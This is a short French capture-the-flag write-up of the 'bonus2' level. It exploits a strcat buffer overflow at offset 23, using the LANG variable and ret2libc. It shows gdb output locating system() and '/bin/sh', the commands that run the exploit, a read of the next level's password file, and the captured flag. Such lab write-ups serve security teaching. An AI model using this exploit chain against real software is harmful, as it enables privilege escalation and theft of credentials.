1. On a un buffer overflow sur le `strcat`, on remarque que si le message précédent est `Hello` on ne peut override que la moitié du `EIP`. En utilisant la variable `LANG="fi"` on peut donc afficher un message plus long.
2. On découvre que l'offset est de 23. On peut donc écrire l'exploit.
3. On utilise la technique du ret2libc.
   ```
   (gdb) info func system
   [...]
   0xb7e6b060

   (gdb) info proc map
   [...]
   0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
   0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
   0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so

   (gdb) find 0xb7e2c000, 0xb7fd1000, "/bin/sh"
   0xb7f8cc58
   1 pattern found.
   ```

```
/tmp/exploit.py
LANG="fi"; ./bonus2 `cat /tmp/f1` `cat /tmp/f2`
$ cat /home/user/bonus3/.pass
```


> Flag: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
